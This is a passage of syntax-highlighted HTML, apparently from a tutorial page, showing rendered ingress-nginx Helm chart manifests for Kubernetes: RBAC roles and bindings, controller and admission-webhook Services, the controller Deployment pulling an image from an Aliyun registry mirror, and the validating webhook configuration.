class="string">get</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">services</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">list</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">watch</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">extensions</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">networking.k8s.io</span>   <span class="comment"># k8s 1.14+</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ingresses</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">list</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">watch</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">events</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">create</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">patch</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">extensions</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">networking.k8s.io</span>   <span class="comment"># k8s 1.14+</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ingresses/status</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">update</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">networking.k8s.io</span>   <span class="comment"># k8s 1.14+</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ingressclasses</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">list</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">watch</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/clusterrolebinding.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/controller-role.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">controller</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namespaces</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">configmaps</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">pods</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">secrets</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">endpoints</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">list</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">watch</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">services</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">list</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">watch</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">extensions</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">networking.k8s.io</span>   <span class="comment"># k8s 1.14+</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ingresses</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">list</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">watch</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">extensions</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">networking.k8s.io</span>   <span class="comment"># k8s 1.14+</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ingresses/status</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">update</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">networking.k8s.io</span>   <span class="comment"># k8s 1.14+</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ingressclasses</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">list</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">watch</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">configmaps</span></span><br><span class="line">    <span class="attr">resourceNames:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ingress-controller-leader-nginx</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">update</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">configmaps</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">create</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">events</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">create</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">patch</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/controller-rolebinding.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">controller</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/controller-service-webhook.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">controller</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-controller-admission</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">ClusterIP</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">https-webhook</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="string">webhook</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">controller</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/controller-service.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">controller</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-controller</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">http</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="string">http</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">https</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="string">https</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">controller</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/controller-deployment.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">controller</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-controller</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">      <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">      <span class="attr">app.kubernetes.io/component:</span> <span class="string">controller</span></span><br><span class="line">  <span class="attr">revisionHistoryLimit:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">minReadySeconds:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">        <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">        <span class="attr">app.kubernetes.io/component:</span> <span class="string">controller</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">dnsPolicy:</span> <span class="string">ClusterFirst</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">controller</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images/ingress-nginx-controller:v0.46.0</span></span><br><span class="line">          <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">          <span class="attr">lifecycle:</span></span><br><span class="line">            <span class="attr">preStop:</span></span><br><span class="line">              <span class="attr">exec:</span></span><br><span class="line">                <span class="attr">command:</span></span><br><span class="line">                  <span class="bullet">-</span> <span class="string">/wait-shutdown</span></span><br><span class="line">          <span class="attr">args:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">/nginx-ingress-controller</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--election-id=ingress-controller-leader</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--ingress-class=nginx</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--configmap=$(POD_NAMESPACE)/ingress-nginx-controller</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--validating-webhook=:8443</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--validating-webhook-certificate=/usr/local/certificates/cert</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">--validating-webhook-key=/usr/local/certificates/key</span></span><br><span class="line">          <span class="attr">securityContext:</span></span><br><span class="line">            <span class="attr">capabilities:</span></span><br><span class="line">              <span class="attr">drop:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">ALL</span></span><br><span class="line">              <span class="attr">add:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">NET_BIND_SERVICE</span></span><br><span class="line">            <span class="attr">runAsUser:</span> <span class="number">101</span></span><br><span class="line">            <span class="attr">allowPrivilegeEscalation:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">env:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">POD_NAME</span></span><br><span class="line">              <span class="attr">valueFrom:</span></span><br><span class="line">                <span class="attr">fieldRef:</span></span><br><span class="line">                  <span class="attr">fieldPath:</span> <span class="string">metadata.name</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">POD_NAMESPACE</span></span><br><span class="line">              <span class="attr">valueFrom:</span></span><br><span class="line">                <span class="attr">fieldRef:</span></span><br><span class="line">                  <span class="attr">fieldPath:</span> <span class="string">metadata.namespace</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">LD_PRELOAD</span></span><br><span class="line">              <span class="attr">value:</span> <span class="string">/usr/local/lib/libmimalloc.so</span></span><br><span class="line">          <span class="attr">livenessProbe:</span></span><br><span class="line">            <span class="attr">failureThreshold:</span> <span class="number">5</span></span><br><span class="line">            <span class="attr">httpGet:</span></span><br><span class="line">              <span class="attr">path:</span> <span class="string">/healthz</span></span><br><span class="line">              <span class="attr">port:</span> <span class="number">10254</span></span><br><span class="line">              <span class="attr">scheme:</span> <span class="string">HTTP</span></span><br><span class="line">            <span class="attr">initialDelaySeconds:</span> <span class="number">10</span></span><br><span class="line">            <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">            <span class="attr">successThreshold:</span> <span class="number">1</span></span><br><span class="line">            <span class="attr">timeoutSeconds:</span> <span class="number">1</span></span><br><span class="line">          <span class="attr">readinessProbe:</span></span><br><span class="line">            <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br><span class="line">            <span class="attr">httpGet:</span></span><br><span class="line">              <span class="attr">path:</span> <span class="string">/healthz</span></span><br><span class="line">              <span class="attr">port:</span> <span class="number">10254</span></span><br><span class="line">              <span class="attr">scheme:</span> <span class="string">HTTP</span></span><br><span class="line">            <span class="attr">initialDelaySeconds:</span> <span class="number">10</span></span><br><span class="line">            <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">            <span class="attr">successThreshold:</span> <span class="number">1</span></span><br><span class="line">            <span class="attr">timeoutSeconds:</span> <span class="number">1</span></span><br><span class="line">          <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">http</span></span><br><span class="line">              <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">              <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">https</span></span><br><span class="line">              <span class="attr">containerPort:</span> <span class="number">443</span></span><br><span class="line">              <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">webhook</span></span><br><span class="line">              <span class="attr">containerPort:</span> <span class="number">8443</span></span><br><span class="line">              <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">          <span class="attr">volumeMounts:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">webhook-cert</span></span><br><span class="line">              <span class="attr">mountPath:</span> <span class="string">/usr/local/certificates/</span></span><br><span class="line">              <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">resources:</span></span><br><span class="line">            <span class="attr">requests:</span></span><br><span class="line">              <span class="attr">cpu:</span> <span class="string">100m</span></span><br><span class="line">              <span class="attr">memory:</span> <span class="string">90Mi</span></span><br><span class="line">      <span class="attr">nodeSelector:</span></span><br><span class="line">        <span class="attr">kubernetes.io/os:</span> <span class="string">linux</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">ingress-nginx</span></span><br><span class="line">      <span class="attr">terminationGracePeriodSeconds:</span> <span class="number">300</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">webhook-cert</span></span><br><span class="line">          <span class="attr">secret:</span></span><br><span class="line">            <span class="attr">secretName:</span> <span class="string">ingress-nginx-admission</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/admission-webhooks/validating-webhook.yaml</span></span><br><span class="line"><span class="comment"># before changing this value, check the required kubernetes version</span></span><br><span class="line"><span class="comment"># https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#prerequisites</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">admissionregistration.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ValidatingWebhookConfiguration</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">admission-webhook</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-admission</span></span><br><span class="line"><span class="attr">webhooks:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">validate.nginx.ingress.kubernetes.io</span></span><br><span class="line">    <span class="attr">matchPolicy:</span> <span class="string">Equivalent</span></span><br><span class="line">    <span class="attr">rules:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">networking.k8s.io</span></span><br><span class="line">        <span class="attr">apiVersions:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">v1beta1</span></span><br><span class="line">        <span class="attr">operations:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">CREATE</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">UPDATE</span></span><br><span class="line">        <span class="attr">resources:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">ingresses</span></span><br><span class="line">    <span class="attr">failurePolicy:</span> <span class="string">Fail</span></span><br><span class="line">    <span class="attr">sideEffects:</span> <span class="string">None</span></span><br><span class="line">    <span class="attr">admissionReviewVersions:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">v1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">v1beta1</span></span><br><span class="line">    <span class="attr">clientConfig:</span></span><br><span class="line">      <span class="attr">service:</span></span><br><span class="line">        <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">ingress-nginx-controller-admission</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/networking/v1beta1/ingresses</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/admission-webhooks/job-patch/serviceaccount.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-admission</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">helm.sh/hook:</span> <span class="string">pre-install,pre-upgrade,post-install,post-upgrade</span></span><br><span class="line">    <span class="attr">helm.sh/hook-delete-policy:</span> <span class="string">before-hook-creation,hook-succeeded</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">admission-webhook</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/admission-webhooks/job-patch/clusterrole.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-admission</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">helm.sh/hook:</span> <span class="string">pre-install,pre-upgrade,post-install,post-upgrade</span></span><br><span class="line">    <span class="attr">helm.sh/hook-delete-policy:</span> <span class="string">before-hook-creation,hook-succeeded</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">admission-webhook</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span 